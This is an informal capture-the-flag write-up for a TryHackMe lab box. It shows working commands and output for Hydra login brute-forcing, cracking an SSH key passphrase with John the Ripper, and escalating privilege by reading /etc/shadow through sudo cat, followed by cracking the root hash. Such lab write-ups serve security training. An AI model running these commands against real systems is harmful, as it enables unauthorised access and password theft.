\\\ task 2\\\
the machine running 2 port 
the ssh version is openssh 7.6p1 
the apache version running is 2.4.29
all found using nmap -sV 
the linux distro is ubuntu because The Nmap scan indicates that the system is running Linux kernel 4.15. This kernel version is commonly associated with Ubuntu 18.04 LTS (Bionic Beaver) and its derivatives.


\\\\ task 3\\\ 
we found user name in the login src code 
now we used hydra to brute force on it 
2 forms of hydra 
[sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.5.142 http-post-form "/admin:user=^USER^&pass=^PASS^:Username or password invalid" -V ]

the second form of hydra 

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.5.142 http-post-form "/admin/:user=admin&pass=^PASS^:F=Username or password invalid"


we see that the url is formed of 3 parts seperated by : , the directory , the login input values , and the stat that we need to check for discrimination 

the user:passwd
admin:xavier

now after w logeged in we found a website that has somekind of a rsa key 
lets download that using wget http://10.10.5.142/admin/panel/id_rsa

──(Abad㉿kali)-[~/Desktop/tryhackme/bruteit]
└─$ sudo wget http://10.10.5.142/admin/panel/id_rsa
[sudo] password for Abad: 
--2025-03-10 21:51:57--  http://10.10.5.142/admin/panel/id_rsa
Connecting to 10.10.5.142:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1766 (1.7K)
Saving to: ‘id_rsa’

id_rsa                 100%[==========================>]   1.72K  --.-KB/s    in 0s      

2025-03-10 21:51:57 (85.7 MB/s) - ‘id_rsa’ saved [1766/1766]

                                                                                          
┌──(Abad㉿kali)-[~/Desktop/tryhackme/bruteit]
└─$ ls
id_rsa  readme.txt
                 
                 now after we downloaded it lets change the contains to a txt file then use jhon on it 
                 
by using ssh2john which is a tool used to extract hash values from SSH private keys so they can be cracked using John the Ripper.

lets extract it 

ssh2john id_rsa > id_rsa.txt


so by using jhon the ripper and rocku we cracked it john id_rsa.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (id_rsa)     
1g 0:00:00:00 DONE (2025-03-10 21:58) 20.00g/s 1452Kp/s 1452Kc/s 1452KC/s saltlake..rockinroll
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                          
┌──(Abad㉿kali)-[~/Desktop/tryhackme/bruteit]
└─$ 



now This command is used to log into a remote machine using SSH with a private key for authentication.

so we used the private key that is downloaded from the website then we cracked it and got the password that it has then used it 

ssh john@10.10.5.142 -i id_rsa

ssh john@10.10.5.142 -i id_rsa
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)


now to escalade priviliges lets list the cmnds that i can run 
sudo -l
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat

This means john can run cat as root without a password.

now This reveals hashed passwords of system users, including root. You can then use John the Ripper to crack them:

sudo /bin/cat /etc/shadow

lets visit gtfobins 

GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

lets find passwd 
this is another methode like the one above to see the hashed or crypted if they are passwd 
LFILE=/etc/shadow 

now these are some hashes 

john@bruteit:~$ sudo cat "$LFILE"
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
sshd:*:18489:0:99999:7:::
john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
john@bruteit:~$ 


lets save thos passes im a file and use jhon the ripper to help us crack them 

sudo mousepad hashs.txt 
[sudo] password for Abad: 
                              \
                             so we see that the passwd for root is football here 
                             
                             john hashs.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (root)     

now since we can use the cmnd cat as a root without passwd 
lets try to find root.txt
sudo cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}

but we are going to login as root and start this

now lets switch to the user root , now remember sudo su doesnt allways work i guess  lets do this 

john@bruteit:~$ su root
Password: 
root@bruteit:/home/john# 

there is the flag 

root@bruteit:~# pwd
/root
root@bruteit:~# ls
root.txt
root@bruteit:~# cat 
^C
root@bruteit:~# cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
root@bruteit:~# 






